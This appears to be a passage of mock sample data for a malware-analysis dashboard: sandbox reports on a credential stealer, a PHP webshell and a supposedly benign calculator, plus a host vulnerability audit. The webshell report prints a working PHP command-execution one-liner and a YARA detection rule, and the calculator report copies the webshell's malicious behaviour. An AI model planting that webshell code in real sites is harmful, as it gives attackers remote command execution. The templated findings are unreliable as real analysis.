        "path": "C:\\Windows\\explorer.exe",
        "cmd": "C:\\Windows\\explorer.exe",
        "integrity": "Medium",
        "children": [
          {
            "pid": 6120,
            "name": "sample.exe",
            "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\CobaltStrike_Beacon.dll",
            "cmd": "\"C:\\Users\\Victim\\AppData\\Local\\Temp\\CobaltStrike_Beacon.dll\" /start",
            "integrity": "Medium",
            "children": [
              {
                "pid": 6900,
                "name": "powershell.exe",
                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmd": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Victim\\AppData\\Local\\Temp\\steal.ps1",
                "integrity": "Medium"
              }
            ]
          }
        ]
      },
      "api_call_stream": [
        {
          "timestamp": 1718000000.1,
          "pid": 6120,
          "process": "sample.exe",
          "api": "IsDebuggerPresent",
          "category": "Anti-Analysis",
          "arguments": "None",
          "return_val": "0 (False)",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.3,
          "pid": 6120,
          "process": "sample.exe",
          "api": "GetTickCount",
          "category": "Timing Evasion",
          "arguments": "None",
          "return_val": "1428570",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.8,
          "pid": 6120,
          "process": "sample.exe",
          "api": "CreateFileW",
          "category": "File Access",
          "arguments": "lpFileName='C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'",
          "return_val": "HANDLE (0x0000014C)",
          "risk": "HIGH"
        },
        {
          "timestamp": 1718000001.1,
          "pid": 6120,
          "process": "sample.exe",
          "api": "CryptUnprotectData",
          "category": "Credential Access",
          "arguments": "pDataIn=[Encrypted Browser Blob], pDataOut=[Plaintext Passwords]",
          "return_val": "SUCCESS",
          "risk": "CRITICAL"
        }
      ],
      "filesystem_activity": [
        {
          "action": "READ_FILE",
          "path": "C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
          "size": "512 KB"
        },
        {
          "action": "CREATE_TEMP",
          "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\passwords_stolen.zip",
          "size": "48 KB"
        }
      ],
      "registry_activity": [],
      "network_activity": [
        {
          "proto": "HTTP",
          "destination": "194.165.16.42:8080",
          "domain": "dropzone-exfil.xyz",
          "type": "Data Exfiltration (HTTP POST)",
          "bytes_sent": 49200
        }
      ],
      "total_api_calls": 4,
      "execution_time_seconds": 3.5
    },
    "ioc_extraction": {
      "iocs": [
        {
          "type": "SHA256 Hash",
          "value": "00b53fba852cffbd95cf056cb296dfbfd0f561c119a5c1451575d6043524c04b",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware",
              "APT"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "MD5 Hash",
          "value": "116b9d8995b4cba782be40c41fc5993a",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "IPv4 Address",
          "value": "194.165.16.42",
          "category": "Network C2",
          "confidence": 90,
          "threat_intel": {
            "abuseipdb_score": "98%",
            "country": "RU / NL",
            "risk": "HIGH"
          }
        },
        {
          "type": "IPv4 Address",
          "value": "45.142.214.18",
          "category": "Network C2",
          "confidence": 90,
          "threat_intel": {
            "abuseipdb_score": "98%",
            "country": "RU / NL",
            "risk": "HIGH"
          }
        },
        {
          "type": "Domain Name",
          "value": "dropzone-exfil.xyz",
          "category": "Network Infrastructure",
          "confidence": 85,
          "threat_intel": {
            "whois": "Registrar Privacy Protected",
            "risk": "HIGH"
          }
        },
        {
          "type": "Domain Name",
          "value": "cdn-cloud-update.net",
          "category": "Network Infrastructure",
          "confidence": 85,
          "threat_intel": {
            "whois": "Registrar Privacy Protected",
            "risk": "HIGH"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\passwords_stolen.zip",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        }
      ],
      "total_extracted": 8,
      "summary_by_category": {
        "Network C2": 4,
        "File Indicator": 4,
        "Persistence": 0,
        "Financial Crypto": 0
      }
    },
    "mitre_mapping": {
      "tactics": [
        {
          "id": "TA0001",
          "name": "Initial Access"
        },
        {
          "id": "TA0002",
          "name": "Execution"
        },
        {
          "id": "TA0003",
          "name": "Persistence"
        },
        {
          "id": "TA0004",
          "name": "Privilege Escalation"
        },
        {
          "id": "TA0005",
          "name": "Defense Evasion"
        },
        {
          "id": "TA0006",
          "name": "Credential Access"
        },
        {
          "id": "TA0007",
          "name": "Discovery"
        },
        {
          "id": "TA0008",
          "name": "Lateral Movement"
        },
        {
          "id": "TA0009",
          "name": "Collection"
        },
        {
          "id": "TA0011",
          "name": "Command and Control"
        },
        {
          "id": "TA0010",
          "name": "Exfiltration"
        },
        {
          "id": "TA0040",
          "name": "Impact"
        }
      ],
      "mapped_techniques": [
        {
          "tactic_id": "TA0006",
          "tactic_name": "Credential Access",
          "technique_id": "T1555.003",
          "technique_name": "Credentials from Web Browsers / DPAPI",
          "evidence": "Access to browser credential store via DPAPI CreateFileW",
          "confidence": "CRITICAL"
        },
        {
          "tactic_id": "TA0007",
          "tactic_name": "Discovery",
          "technique_id": "T1497.001",
          "technique_name": "Virtualization/Sandbox Evasion (System Checks)",
          "evidence": "Sandbox timing/anti-debug API check IsDebuggerPresent",
          "confidence": "MEDIUM"
        },
        {
          "tactic_id": "TA0011",
          "tactic_name": "Command and Control",
          "technique_id": "T1071.001",
          "technique_name": "Application Layer Protocol: Web Protocols (HTTP/HTTPS)",
          "evidence": "Established C2 beacon stream to 194.165.16.42:8080 (dropzone-exfil.xyz)",
          "confidence": "HIGH"
        }
      ],
      "total_mapped_techniques": 3,
      "navigator_layer": {
        "name": "Malware Analysis ATT&CK Coverage",
        "versions": {
          "attack": "14",
          "navigator": "4.8"
        },
        "domain": "enterprise-attack",
        "description": "Automatically generated MITRE ATT&CK Mapping Layer",
        "techniques": [
          {
            "techniqueID": "T1555.003",
            "tactic": "credential-access",
            "score": 100,
            "comment": "Access to browser credential store via DPAPI CreateFileW",
            "enabled": true
          },
          {
            "techniqueID": "T1497.001",
            "tactic": "discovery",
            "score": 50,
            "comment": "Sandbox timing/anti-debug API check IsDebuggerPresent",
            "enabled": true
          },
          {
            "techniqueID": "T1071.001",
            "tactic": "command-and-control",
            "score": 75,
            "comment": "Established C2 beacon stream to 194.165.16.42:8080 (dropzone-exfil.xyz)",
            "enabled": true
          }
        ]
      }
    },
    "threat_scoring": {
      "threat_score": 55,
      "verdict": "SUSPICIOUS",
      "severity": "MEDIUM",
      "color": "#eab308",
      "score_breakdown": {
        "static_score": 10,
        "yara_score": 10,
        "behavioral_score": 16,
        "ioc_score": 10,
        "mitre_score": 9
      },
      "risk_factors": [
        "YARA Rule Hit Count: 1",
        "Entropy: 5.0921 (Unpacked)",
        "Suspicious API Invocations: 4",
        "Extracted Indicators of Compromise: 8",
        "MITRE ATT&CK Techniques Mapped: 3"
      ]
    }
  },
  "sample_webshell": {
    "report_id": "fb046476859f49a93aa2b284993892bd2e125ace1eba2e950a9a84422389124c",
    "sample_name": "c99_webshell.php",
    "timestamp": "2026-09-18T16:00:00Z",
    "analysis_duration_ms": 0.8,
    "file_size_bytes": 145,
    "static_analysis": {
      "hashes": {
        "md5": "23a32d6e4d7e930d588e9283af118253",
        "sha1": "861f7c7e79381f4cda638b8ada7bc83897b9c1d6",
        "sha256": "fb046476859f49a93aa2b284993892bd2e125ace1eba2e950a9a84422389124c",
        "sha512": "89efe2d51547f5c968cfbe60cf6506c13e7a93dcc08350e37074dc83166c5c068553c07a15f4472acda98b50fc6cea178704fad57f65ab9cdae6b44c33846331",
        "ssdeep": "384:fb046476859f49a9:3aa2b284993892bd",
        "size_bytes": 145
      },
      "file_info": {
        "type": "Generic Binary / Unknown Data",
        "architecture": "Unknown",
        "magic_bytes": "3C3F7068",
        "entropy": 5.4473
      },
      "pe_structure": {
        "sections": [
          {
            "name": "BLOCK_1",
            "virtual_size": "0x0030",
            "raw_size": 48,
            "entropy": 4.7857,
            "characteristics": "DATA_BLOCK",
            "is_suspicious": false
          },
          {
            "name": "BLOCK_2",
            "virtual_size": "0x0030",
            "raw_size": 48,
            "entropy": 4.8711,
            "characteristics": "DATA_BLOCK",
            "is_suspicious": false
          },
          {
            "name": "BLOCK_3",
            "virtual_size": "0x0030",
            "raw_size": 48,
            "entropy": 4.5952,
            "characteristics": "DATA_BLOCK",
            "is_suspicious": false
          }
        ],
        "imports": [],
        "import_count": 0,
        "is_packed": false,
        "packer": null,
        "digital_signature": {
          "signed": false,
          "status": "UNSIGNED (Untrusted Origin)",
          "publisher": "Unknown / Missing Certificate"
        }
      },
      "strings": {
        "ascii": [
          "<?php eval(base64_decode('c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOw==')); shell_exec($_POST['cmd']); passthru($_GET['exec']); system($_REQUEST['c']); ?>"
        ],
        "ascii_total": 1,
        "unicode": [],
        "unicode_total": 0,
        "decoded": [
          {
            "original": "c3lzdGVtKCRfUkVRVUVTVFsnY21kJ10p...",
            "type": "Base64 Decoded",
            "decoded": "system($_REQUEST['cmd']);"
          }
        ]
      }
    },
    "yara_scan": {
      "matches": [
        {
          "rule_id": "rule_webshell_php",
          "rule_name": "WebShell_PHP_Generic_Command_Execution",
          "category": "WebShell",
          "severity": "CRITICAL",
          "description": "Detects PHP webshell execution functions (eval, system, passthru, shell_exec)",
          "matched_strings": [
            "eval(base64_decode(",
            "shell_exec($_POST",
            "passthru($_GET",
            "system($_REQUEST"
          ],
          "threat_level": 90
        }
      ],
      "match_count": 1,
      "total_rules_scanned": 6
    },
    "behavioral_analysis": {
      "process_tree": {
        "pid": 4096,
        "name": "explorer.exe",
        "path": "C:\\Windows\\explorer.exe",
        "cmd": "C:\\Windows\\explorer.exe",
        "integrity": "Medium",
        "children": [
          {
            "pid": 6120,
            "name": "sample.exe",
            "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\c99_webshell.php",
            "cmd": "\"C:\\Users\\Victim\\AppData\\Local\\Temp\\c99_webshell.php\" /start",
            "integrity": "Medium",
            "children": []
          }
        ]
      },
      "api_call_stream": [
        {
          "timestamp": 1718000000.1,
          "pid": 6120,
          "process": "sample.exe",
          "api": "IsDebuggerPresent",
          "category": "Anti-Analysis",
          "arguments": "None",
          "return_val": "0 (False)",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.3,
          "pid": 6120,
          "process": "sample.exe",
          "api": "GetTickCount",
          "category": "Timing Evasion",
          "arguments": "None",
          "return_val": "1428570",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.4,
          "pid": 6120,
          "process": "sample.exe",
          "api": "RegSetValueExW",
          "category": "Registry Modification",
          "arguments": "Key='HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', Value='Updater'",
          "return_val": "ERROR_SUCCESS",
          "risk": "HIGH"
        },
        {
          "timestamp": 1718000001.0,
          "pid": 6120,
          "process": "sample.exe",
          "api": "URLDownloadToFileW",
          "category": "Network Download",
          "arguments": "szURL='http://malicious-stage.com/payload.bin', szFileName='C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe'",
          "return_val": "S_OK",
          "risk": "HIGH"
        }
      ],
      "filesystem_activity": [
        {
          "action": "CREATE_TEMP",
          "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
          "size": "256 KB"
        }
      ],
      "registry_activity": [
        {
          "action": "SET_VALUE",
          "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe"
        }
      ],
      "network_activity": [
        {
          "proto": "HTTP",
          "destination": "185.190.140.88:80",
          "domain": "malicious-stage.com",
          "type": "Payload Downloader",
          "bytes_sent": 512
        }
      ],
      "total_api_calls": 4,
      "execution_time_seconds": 3.5
    },
    "ioc_extraction": {
      "iocs": [
        {
          "type": "SHA256 Hash",
          "value": "fb046476859f49a93aa2b284993892bd2e125ace1eba2e950a9a84422389124c",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware",
              "APT"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "MD5 Hash",
          "value": "23a32d6e4d7e930d588e9283af118253",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "IPv4 Address",
          "value": "185.190.140.88",
          "category": "Network C2",
          "confidence": 90,
          "threat_intel": {
            "abuseipdb_score": "98%",
            "country": "RU / NL",
            "risk": "HIGH"
          }
        },
        {
          "type": "Domain Name",
          "value": "malicious-stage.com",
          "category": "Network Infrastructure",
          "confidence": 85,
          "threat_intel": {
            "whois": "Registrar Privacy Protected",
            "risk": "HIGH"
          }
        },
        {
          "type": "Registry Key",
          "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
          "category": "Persistence Mechanism",
          "confidence": 95,
          "threat_intel": {
            "persistence": "Windows Startup RunKey",
            "risk": "HIGH"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        }
      ],
      "total_extracted": 6,
      "summary_by_category": {
        "Network C2": 2,
        "File Indicator": 3,
        "Persistence": 1,
        "Financial Crypto": 0
      }
    },
    "mitre_mapping": {
      "tactics": [
        {
          "id": "TA0001",
          "name": "Initial Access"
        },
        {
          "id": "TA0002",
          "name": "Execution"
        },
        {
          "id": "TA0003",
          "name": "Persistence"
        },
        {
          "id": "TA0004",
          "name": "Privilege Escalation"
        },
        {
          "id": "TA0005",
          "name": "Defense Evasion"
        },
        {
          "id": "TA0006",
          "name": "Credential Access"
        },
        {
          "id": "TA0007",
          "name": "Discovery"
        },
        {
          "id": "TA0008",
          "name": "Lateral Movement"
        },
        {
          "id": "TA0009",
          "name": "Collection"
        },
        {
          "id": "TA0011",
          "name": "Command and Control"
        },
        {
          "id": "TA0010",
          "name": "Exfiltration"
        },
        {
          "id": "TA0040",
          "name": "Impact"
        }
      ],
      "mapped_techniques": [
        {
          "tactic_id": "TA0003",
          "tactic_name": "Persistence",
          "technique_id": "T1547.001",
          "technique_name": "Registry Run Keys / Startup Folder",
          "evidence": "Registry persistence modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
          "confidence": "HIGH"
        },
        {
          "tactic_id": "TA0007",
          "tactic_name": "Discovery",
          "technique_id": "T1497.001",
          "technique_name": "Virtualization/Sandbox Evasion (System Checks)",
          "evidence": "Sandbox timing/anti-debug API check IsDebuggerPresent",
          "confidence": "MEDIUM"
        },
        {
          "tactic_id": "TA0011",
          "tactic_name": "Command and Control",
          "technique_id": "T1071.001",
          "technique_name": "Application Layer Protocol: Web Protocols (HTTP/HTTPS)",
          "evidence": "Established C2 beacon stream to 185.190.140.88:80 (malicious-stage.com)",
          "confidence": "HIGH"
        }
      ],
      "total_mapped_techniques": 3,
      "navigator_layer": {
        "name": "Malware Analysis ATT&CK Coverage",
        "versions": {
          "attack": "14",
          "navigator": "4.8"
        },
        "domain": "enterprise-attack",
        "description": "Automatically generated MITRE ATT&CK Mapping Layer",
        "techniques": [
          {
            "techniqueID": "T1547.001",
            "tactic": "persistence",
            "score": 75,
            "comment": "Registry persistence modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
            "enabled": true
          },
          {
            "techniqueID": "T1497.001",
            "tactic": "discovery",
            "score": 50,
            "comment": "Sandbox timing/anti-debug API check IsDebuggerPresent",
            "enabled": true
          },
          {
            "techniqueID": "T1071.001",
            "tactic": "command-and-control",
            "score": 75,
            "comment": "Established C2 beacon stream to 185.190.140.88:80 (malicious-stage.com)",
            "enabled": true
          }
        ]
      }
    },
    "threat_scoring": {
      "threat_score": 46,
      "verdict": "SUSPICIOUS",
      "severity": "MEDIUM",
      "color": "#eab308",
      "score_breakdown": {
        "static_score": 0,
        "yara_score": 15,
        "behavioral_score": 12,
        "ioc_score": 10,
        "mitre_score": 9
      },
      "risk_factors": [
        "YARA Rule Hit Count: 1",
        "Entropy: 5.4473 (Unpacked)",
        "Suspicious API Invocations: 4",
        "Extracted Indicators of Compromise: 6",
        "MITRE ATT&CK Techniques Mapped: 3"
      ]
    }
  },
  "sample_benign_calc": {
    "report_id": "b7fc34973d5088dfa34da484cc843c720dd1be52fae13a93bc786615c3356acc",
    "sample_name": "Calculator_Utility.exe",
    "timestamp": "2026-09-18T16:00:00Z",
    "analysis_duration_ms": 0.71,
    "file_size_bytes": 115,
    "static_analysis": {
      "hashes": {
        "md5": "a5d33ec1f0cf133e4a7996fd1d31d385",
        "sha1": "0f525b6cc0ef9f52b1955a4985bf400d62998a7c",
        "sha256": "b7fc34973d5088dfa34da484cc843c720dd1be52fae13a93bc786615c3356acc",
        "sha512": "44e38870c1bb99aa79e88d55e4ae639c2e2eca7f71cfe4577a1db65a9cb04f728abbbc4d28992c2a8aec50bbdf47d57cf8925e91feeba6583764aa002e374b22",
        "ssdeep": "384:b7fc34973d5088df:a34da484cc843c72",
        "size_bytes": 115
      },
      "file_info": {
        "type": "PE32/64 Executable (Windows)",
        "architecture": "x86/x64",
        "magic_bytes": "4D5A9000",
        "entropy": 4.7739
      },
      "pe_structure": {
        "sections": [
          {
            "name": ".text",
            "virtual_size": "0x0013",
            "raw_size": 19,
            "entropy": 3.6163,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE",
            "is_suspicious": false
          },
          {
            "name": ".rdata",
            "virtual_size": "0x0013",
            "raw_size": 19,
            "entropy": 3.8269,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".data",
            "virtual_size": "0x0013",
            "raw_size": 19,
            "entropy": 3.4058,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".pdata",
            "virtual_size": "0x0013",
            "raw_size": 19,
            "entropy": 3.5111,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".rsrc",
            "virtual_size": "0x0013",
            "raw_size": 19,
            "entropy": 4.0374,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          },
          {
            "name": ".reloc",
            "virtual_size": "0x0013",
            "raw_size": 19,
            "entropy": 3.5766,
            "characteristics": "IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE",
            "is_suspicious": false
          }
        ],
        "imports": [],
        "import_count": 0,
        "is_packed": false,
        "packer": null,
        "digital_signature": {
          "signed": false,
          "status": "UNSIGNED (Untrusted Origin)",
          "publisher": "Unknown / Missing Certificate"
        }
      },
      "strings": {
        "ascii": [
          "Microsoft Windows Calculator System Utility. GetModuleHandleA CreateWindowExW DispatchMessageW ExitProcess."
        ],
        "ascii_total": 1,
        "unicode": [],
        "unicode_total": 0,
        "decoded": []
      }
    },
    "yara_scan": {
      "matches": [],
      "match_count": 0,
      "total_rules_scanned": 6
    },
    "behavioral_analysis": {
      "process_tree": {
        "pid": 4096,
        "name": "explorer.exe",
        "path": "C:\\Windows\\explorer.exe",
        "cmd": "C:\\Windows\\explorer.exe",
        "integrity": "Medium",
        "children": [
          {
            "pid": 6120,
            "name": "Calculator_Utility.exe",
            "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\Calculator_Utility.exe",
            "cmd": "\"C:\\Users\\Victim\\AppData\\Local\\Temp\\Calculator_Utility.exe\" /start",
            "integrity": "Medium",
            "children": []
          }
        ]
      },
      "api_call_stream": [
        {
          "timestamp": 1718000000.1,
          "pid": 6120,
          "process": "Calculator_Utility.exe",
          "api": "IsDebuggerPresent",
          "category": "Anti-Analysis",
          "arguments": "None",
          "return_val": "0 (False)",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.3,
          "pid": 6120,
          "process": "Calculator_Utility.exe",
          "api": "GetTickCount",
          "category": "Timing Evasion",
          "arguments": "None",
          "return_val": "1428570",
          "risk": "LOW"
        },
        {
          "timestamp": 1718000000.4,
          "pid": 6120,
          "process": "Calculator_Utility.exe",
          "api": "RegSetValueExW",
          "category": "Registry Modification",
          "arguments": "Key='HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', Value='Updater'",
          "return_val": "ERROR_SUCCESS",
          "risk": "HIGH"
        },
        {
          "timestamp": 1718000001.0,
          "pid": 6120,
          "process": "Calculator_Utility.exe",
          "api": "URLDownloadToFileW",
          "category": "Network Download",
          "arguments": "szURL='http://malicious-stage.com/payload.bin', szFileName='C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe'",
          "return_val": "S_OK",
          "risk": "HIGH"
        }
      ],
      "filesystem_activity": [
        {
          "action": "CREATE_TEMP",
          "path": "C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
          "size": "256 KB"
        }
      ],
      "registry_activity": [
        {
          "action": "SET_VALUE",
          "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe"
        }
      ],
      "network_activity": [
        {
          "proto": "HTTP",
          "destination": "185.190.140.88:80",
          "domain": "malicious-stage.com",
          "type": "Payload Downloader",
          "bytes_sent": 512
        }
      ],
      "total_api_calls": 4,
      "execution_time_seconds": 3.5
    },
    "ioc_extraction": {
      "iocs": [
        {
          "type": "SHA256 Hash",
          "value": "b7fc34973d5088dfa34da484cc843c720dd1be52fae13a93bc786615c3356acc",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware",
              "APT"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "MD5 Hash",
          "value": "a5d33ec1f0cf133e4a7996fd1d31d385",
          "category": "File Indicator",
          "confidence": 100,
          "threat_intel": {
            "virustotal_ratio": "58/72",
            "alienvault_otx": [
              "Malware"
            ],
            "risk": "HIGH"
          }
        },
        {
          "type": "IPv4 Address",
          "value": "185.190.140.88",
          "category": "Network C2",
          "confidence": 90,
          "threat_intel": {
            "abuseipdb_score": "98%",
            "country": "RU / NL",
            "risk": "HIGH"
          }
        },
        {
          "type": "Domain Name",
          "value": "malicious-stage.com",
          "category": "Network Infrastructure",
          "confidence": 85,
          "threat_intel": {
            "whois": "Registrar Privacy Protected",
            "risk": "HIGH"
          }
        },
        {
          "type": "Registry Key",
          "value": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
          "category": "Persistence Mechanism",
          "confidence": 95,
          "threat_intel": {
            "persistence": "Windows Startup RunKey",
            "risk": "HIGH"
          }
        },
        {
          "type": "File Path / Dropped Artifact",
          "value": "C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
          "category": "File System Modification",
          "confidence": 90,
          "threat_intel": {
            "file_type": "Executable / Ransom Note",
            "risk": "MEDIUM"
          }
        }
      ],
      "total_extracted": 6,
      "summary_by_category": {
        "Network C2": 2,
        "File Indicator": 3,
        "Persistence": 1,
        "Financial Crypto": 0
      }
    },
    "mitre_mapping": {
      "tactics": [
        {
          "id": "TA0001",
          "name": "Initial Access"
        },
        {
          "id": "TA0002",
          "name": "Execution"
        },
        {
          "id": "TA0003",
          "name": "Persistence"
        },
        {
          "id": "TA0004",
          "name": "Privilege Escalation"
        },
        {
          "id": "TA0005",
          "name": "Defense Evasion"
        },
        {
          "id": "TA0006",
          "name": "Credential Access"
        },
        {
          "id": "TA0007",
          "name": "Discovery"
        },
        {
          "id": "TA0008",
          "name": "Lateral Movement"
        },
        {
          "id": "TA0009",
          "name": "Collection"
        },
        {
          "id": "TA0011",
          "name": "Command and Control"
        },
        {
          "id": "TA0010",
          "name": "Exfiltration"
        },
        {
          "id": "TA0040",
          "name": "Impact"
        }
      ],
      "mapped_techniques": [
        {
          "tactic_id": "TA0003",
          "tactic_name": "Persistence",
          "technique_id": "T1547.001",
          "technique_name": "Registry Run Keys / Startup Folder",
          "evidence": "Registry persistence modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
          "confidence": "HIGH"
        },
        {
          "tactic_id": "TA0007",
          "tactic_name": "Discovery",
          "technique_id": "T1497.001",
          "technique_name": "Virtualization/Sandbox Evasion (System Checks)",
          "evidence": "Sandbox timing/anti-debug API check IsDebuggerPresent",
          "confidence": "MEDIUM"
        },
        {
          "tactic_id": "TA0011",
          "tactic_name": "Command and Control",
          "technique_id": "T1071.001",
          "technique_name": "Application Layer Protocol: Web Protocols (HTTP/HTTPS)",
          "evidence": "Established C2 beacon stream to 185.190.140.88:80 (malicious-stage.com)",
          "confidence": "HIGH"
        }
      ],
      "total_mapped_techniques": 3,
      "navigator_layer": {
        "name": "Malware Analysis ATT&CK Coverage",
        "versions": {
          "attack": "14",
          "navigator": "4.8"
        },
        "domain": "enterprise-attack",
        "description": "Automatically generated MITRE ATT&CK Mapping Layer",
        "techniques": [
          {
            "techniqueID": "T1547.001",
            "tactic": "persistence",
            "score": 75,
            "comment": "Registry persistence modified: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\Victim\\AppData\\Local\\Temp\\stage2.exe",
            "enabled": true
          },
          {
            "techniqueID": "T1497.001",
            "tactic": "discovery",
            "score": 50,
            "comment": "Sandbox timing/anti-debug API check IsDebuggerPresent",
            "enabled": true
          },
          {
            "techniqueID": "T1071.001",
            "tactic": "command-and-control",
            "score": 75,
            "comment": "Established C2 beacon stream to 185.190.140.88:80 (malicious-stage.com)",
            "enabled": true
          }
        ]
      }
    },
    "threat_scoring": {
      "threat_score": 31,
      "verdict": "LOW RISK",
      "severity": "LOW",
      "color": "#3b82f6",
      "score_breakdown": {
        "static_score": 0,
        "yara_score": 0,
        "behavioral_score": 12,
        "ioc_score": 10,
        "mitre_score": 9
      },
      "risk_factors": [
        "YARA Rule Hit Count: 0",
        "Entropy: 4.7739 (Unpacked)",
        "Suspicious API Invocations: 4",
        "Extracted Indicators of Compromise: 6",
        "MITRE ATT&CK Techniques Mapped: 3"
      ]
    }
  }
};

export const FALLBACK_HOST_ASSESSMENT: any = {
  "host_info": {
    "hostname": "CHOTU",
    "os": "Windows 11 (10.0.26200)",
    "architecture": "AMD64",
    "timestamp": "2026-09-19T00:00:00Z",
    "scan_duration_ms": 107018.2
  },
  "health_score": 80,
  "status": "HEALTHY / SECURE",
  "status_color": "#10b981",
  "alert_level": "LOW",
  "summary": {
    "total_processes_scanned": 3,
    "suspicious_processes": 0,
    "installed_software_scanned": 125,
    "known_vulnerabilities_detected": 2,
    "persistence_keys_checked": 8
  },
  "active_threats": [],
  "software_audit": {
    "total_software_found": 125,
    "vulnerability_count": 2,
    "vulnerabilities": [
      {
        "software": "VLC media player",
        "version": "3.0.7",
        "cve": "CVE-2023-47359",
        "severity": "MEDIUM",
        "cvss": 6.5,
        "description": "Null pointer dereference causing application crash or denial of service on crafted media files.",
        "remediation": "Update VLC Media Player to 3.0.19+."
      },
      {
        "software": "WinRAR 5.91 (64-bit)",
        "version": "5.91.0",
        "cve": "CVE-2023-38831",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "description": "WinRAR Remote Code Execution vulnerability allowing attackers to execute arbitrary code when opening crafted ZIP/RAR archives.",
        "remediation": "Upgrade WinRAR to version 6.24 or higher immediately."
      }
    ],
    "installed_software": [
      {
        "name": "Git",
        "version": "2.54.0",
        "publisher": "The Git Development Community",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Mozilla Firefox 76.0.1 (x64 en-US)",
        "version": "76.0.1",
        "publisher": "Mozilla",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Mozilla Maintenance Service",
        "version": "76.0.1",
        "publisher": "Mozilla",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft OneDrive",
        "version": "26.163.0823.0004",
        "publisher": "Microsoft Corporation",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "PEM-HTTPD 2.4.66",
        "version": "2.4.66-1",
        "publisher": "EnterpriseDB",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "PostgreSQL 14",
        "version": "14.24-2",
        "publisher": "PostgreSQL Global Development Group",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "PostgreSQL 18",
        "version": "18.6-3",
        "publisher": "PostgreSQL Global Development Group",
        "has_cve": false,
        "cve_id": null,
        "severity": null
      },
      {
        "name": "Microsoft Project Professional 2016 - en-us",
